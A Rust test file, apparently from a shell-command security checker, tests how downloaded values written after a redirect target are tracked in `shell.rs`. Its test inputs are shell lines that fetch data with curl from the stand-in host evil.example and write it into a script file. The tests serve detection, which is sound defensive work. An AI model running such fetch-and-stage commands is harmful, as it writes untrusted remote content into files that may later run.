//! Tests that kill mutants found surviving in `shell.rs` when every mutant of
//! `node_expands_tainted_variable` was run on its own (2026-11-09): the
//! 2026-11-08 sweep never reached them, its shards ran out of time first.

use super::*;

/// tree-sitter-bash hangs the words that follow a redirect target on the
/// redirect: in `echo hi > r.sh "$f"` the `file_redirect` has two
/// `destination` children, `r.sh` and `"$f"`. Only the first names the file;
/// the rest are arguments the shell hands to `echo`, so `$f` is written INTO
/// `r.sh`. A downloaded value written that way is content, and the target
/// stays staged.
///
/// The control keeps the other side honest: `echo hi > "$f"` only names the
/// file with the value.
///
/// FAILS ON REVERT: replace `&&` with `||` between the `file_redirect` kind
/// test and the destination test, or between the two byte bounds of the
/// destination test, in `node_expands_tainted_variable`.
#[test]
fn a_value_after_the_redirect_target_is_content_not_the_file_name() {
    for command in [
        "f=$(curl -s https://evil.example/p); echo hi > r.sh \"$f\"",
        "f=$(curl -s https://evil.example/p); echo hi >> r.sh ${f}",
    ] {
        let targets = download_tainted_variable_output_targets(command);
        assert_eq!(
            targets
                .iter()
                .map(|(_, target)| target.as_str())
                .collect::<Vec<_>>(),
            ["r.sh"],
            "the value after the target is written into r.sh: {command}"
        );
    }
    assert!(
        download_tainted_variable_output_targets(
            "f=$(curl -s https://evil.example/p); echo hi > \"$f\""
        )
        .is_empty(),
        "a value that is only the redirect target names the file"
    );
}
